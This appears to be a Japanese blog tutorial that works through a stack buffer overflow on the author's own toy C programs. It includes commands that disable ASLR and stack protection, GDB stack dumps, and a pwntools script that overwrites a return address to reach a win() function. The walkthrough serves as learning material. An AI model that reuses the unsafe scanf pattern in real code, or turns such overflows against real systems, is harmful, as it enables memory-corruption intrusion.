---
title: "バッファオーバーフローをやってみる"
createdAt: "2024-08-03"
category:
  - "hacking"
---

# 環境

```bash
 ＞ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

```bash
＞ gcc --version
gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Copyright (C) 2021 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

# バッファオーバーフローの脆弱性

```c:test.c
#include <stdio.h>
#include <string.h>

void vuln(char *str){
  char str2[] = "bbbb";
  char tmp[16];

  printf("入力してください\n");
  scanf("%s", tmp);

  if(strcmp(str, str2) == 0){
    printf("success\n");
  }else{
    printf("failed\n");
  }
}

int main(){
  char string[] = "aaaa";
  vuln(string);
}
```

上記のようなプログラムを作成した。

12 行目で`str` と`str2` を比較しているが、異なる値が入っているため通常であればこの式が成り立つことはない。

ただし、9 行目にバッファオーバーフローの脆弱性があり、`tmp` が確保している 16 バイトを超えた文字列を入力すると、`str2` の値を書き換えることができる。

# 防御機構の無効化

## ASLR の無効化

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

## コンパイル

```bash
$ gcc -fno-stack-protector -z execstack -m32 -o  test test.c
```

# GDB での確認

```bash
$ gdb test
```

`scanf()` を行う前のスタックの値を見てみると、`str2` が`0xffffcffb`~`0xffffcffe` に格納されていることがわかる。

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x56557021 --> 0x73007325 ('%s')
EBX: 0x56558fd0 --> 0x3ed8
ECX: 0xf7e279b4 --> 0x0
EDX: 0x1
ESI: 0xffffd104 --> 0xffffd2c0
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffd008 --> 0xffffd038 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x56555000 --> 0x464c457f
ESP: 0xffffcfd0 ("!pUV\353\317\377\377\064PUV\311aUV\b\326\377\367\v")
EIP: 0x565561fa (<vuln+61>:	call   0x56556070 <__isoc99_scanf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565561f2 <vuln+53>:	push   eax
   0x565561f3 <vuln+54>:	lea    eax,[ebx-0x1faf]
   0x565561f9 <vuln+60>:	push   eax
=> 0x565561fa <vuln+61>:	call   0x56556070 <__isoc99_scanf@plt>
   0x565561ff <vuln+66>:	add    esp,0x10
   0x56556202 <vuln+69>:	sub    esp,0x8
   0x56556205 <vuln+72>:	lea    eax,[ebp-0xd]
   0x56556208 <vuln+75>:	push   eax
Guessed arguments:
arg[0]: 0x56557021 --> 0x73007325 ('%s')
arg[1]: 0xffffcfeb --> 0xffd1dcff
[------------------------------------stack-------------------------------------]
0000| 0xffffcfd0 ("!pUV\353\317\377\377\064PUV\311aUV\b\326\377\367\v")
0004| 0xffffcfd4 --> 0xffffcfeb --> 0xffd1dcff
0008| 0xffffcfd8 ("4PUV\311aUV\b\326\377\367\v")
0012| 0xffffcfdc --> 0x565561c9 (<vuln+12>:	add    ebx,0x2e07)
0016| 0xffffcfe0 --> 0xf7ffd608 --> 0xf7fc6000 --> 0x464c457f
0020| 0xffffcfe4 --> 0xb ('\x0b')
0024| 0xffffcfe8 --> 0xffffd04c --> 0xf7c21519 (add    esp,0x10)
0028| 0xffffcfec --> 0xffffd1dc --> 0x20 (' ')
0032| 0xffffcff0 --> 0x0
0036| 0xffffcff4 --> 0x0
0040| 0xffffcff8 --> 0x62000000 ('')
0044| 0xffffcffc --> 0x626262 ('bbb')
0048| 0xffffd000 --> 0xf7fc4570 (<__kernel_vsyscall>:	push   ecx)
0052| 0xffffd004 --> 0xf7e26000 --> 0x225dac
0056| 0xffffd008 --> 0xffffd038 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x56555000 --> 0x464c457f
[------------------------------------------------------------------------------]
```

`c` を 16 個入力してみると、`temp` は`0xffffcfeb`~`0xffffcffa` に格納されていることがわかる。

```bash
[------------------------------------stack-------------------------------------]
0000| 0xffffcfd0 ("!pUV\353\317\377\377\064PUV\311aUV\b\326\377\367\v")
0004| 0xffffcfd4 --> 0xffffcfeb ('c' <repeats 16 times>)
0008| 0xffffcfd8 ("4PUV\311aUV\b\326\377\367\v")
0012| 0xffffcfdc --> 0x565561c9 (<vuln+12>:	add    ebx,0x2e07)
0016| 0xffffcfe0 --> 0xf7ffd608 --> 0xf7fc6000 --> 0x464c457f
0020| 0xffffcfe4 --> 0xb ('\x0b')
0024| 0xffffcfe8 --> 0x63ffd04c
0028| 0xffffcfec ('c' <repeats 15 times>)
0032| 0xffffcff0 ('c' <repeats 11 times>)
0036| 0xffffcff4 ("ccccccc")
0040| 0xffffcff8 --> 0x636363 ('ccc')
0044| 0xffffcffc --> 0x626262 ('bbb')
0048| 0xffffd000 --> 0xf7fc4570 (<__kernel_vsyscall>:	push   ecx)
0052| 0xffffd004 --> 0xf7e26000 --> 0x225dac
0056| 0xffffd008 --> 0xffffd038 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x56555000 --> 0x464c457f
[------------------------------------------------------------------------------]
```

そのため、`ccccccccccccccccaaaa` を入力すると、バッファオーバーフローにより、`str2` を`aaaa` に書き換えることができる。

```bash
[------------------------------------stack-------------------------------------]
0000| 0xffffcfd0 ("!pUV\353\317\377\377\064PUV\311aUV\b\326\377\367\v")
0004| 0xffffcfd4 --> 0xffffcfeb ('c' <repeats 16 times>, "aaaa")
0008| 0xffffcfd8 ("4PUV\311aUV\b\326\377\367\v")
0012| 0xffffcfdc --> 0x565561c9 (<vuln+12>:	add    ebx,0x2e07)
0016| 0xffffcfe0 --> 0xf7ffd608 --> 0xf7fc6000 --> 0x464c457f
0020| 0xffffcfe4 --> 0xb ('\x0b')
0024| 0xffffcfe8 --> 0x63ffd04c
0028| 0xffffcfec ('c' <repeats 15 times>, "aaaa")
0032| 0xffffcff0 ('c' <repeats 11 times>, "aaaa")
0036| 0xffffcff4 ("cccccccaaaa")
0040| 0xffffcff8 ("cccaaaa")
0044| 0xffffcffc --> 0x616161 ('aaa')
0048| 0xffffd000 --> 0xf7fc4570 (<__kernel_vsyscall>:	push   ecx)
0052| 0xffffd004 --> 0xf7e26000 --> 0x225dac
0056| 0xffffd008 --> 0xffffd038 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x56555000 --> 0x464c457f
[------------------------------------------------------------------------------]
```

# リターンアドレスの書き換え

```c:win.c
#include <stdio.h>
#include <string.h>

void win(){
   printf("success\n");
}

void vuln(){
  char tmp[16];

  scanf("%s", tmp);
}

int main(){
  vuln();
  printf("failed\n");
}
```

上記のようなプログラムを書きました。`temp` にバッファオーバーフローの脆弱性があるため`vuln` のリターンアドレスを書き換えることができます。

GDB を使ってスタック上のリターンアドレスの場所と、`win` のアドレスを調べます。

`win` のアドレスは`0x565561ad` とわかりました。

```bash
gdb-peda$ p win
$1 = {<text variable, no debug info>} 0x565561ad <win>
```

ランダムな文字列を作成します。

```bash
gdb-peda$ pattc 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```

上記の文字列を入力すると、`EIP` が`AA;A` となっていることがわかります。

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0x41412d41 ('A-AA')
ECX: 0xf7da0380 --> 0x20002
EDX: 0x0
ESI: 0xffffd0f4 --> 0xffffd2be
EDI: 0xf7ffcb80 --> 0x0
EBP: 0x44414128 ('(AAD')
ESP: 0xffffd020 ("A)AAEAAaAA0AAFAAbA")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 ("A)AAEAAaAA0AAFAAbA")
0004| 0xffffd024 ("EAAaAA0AAFAAbA")
0008| 0xffffd028 ("AA0AAFAAbA")
0012| 0xffffd02c ("AFAAbA")
0016| 0xffffd030 --> 0xff004162
0020| 0xffffd034 --> 0x70 ('p')
0024| 0xffffd038 --> 0xf7ffd000 --> 0x36f2c
0028| 0xffffd03c --> 0xf7c21519 (add    esp,0x10)
[------------------------------------------------------------------------------]
```

`AA;A` の開始位置を調べると 28 だということがわかります。

```bash
gdb-peda$ patto AA;A
AA;A found at offset: 28
```

python でスクリプトを作りました。

```python
from pwn import *

p = process("./test2")
#print(p.recvline())
p.sendline("A"*28 + "\xad\x61\x55\x56")
print(p.recvline())
```
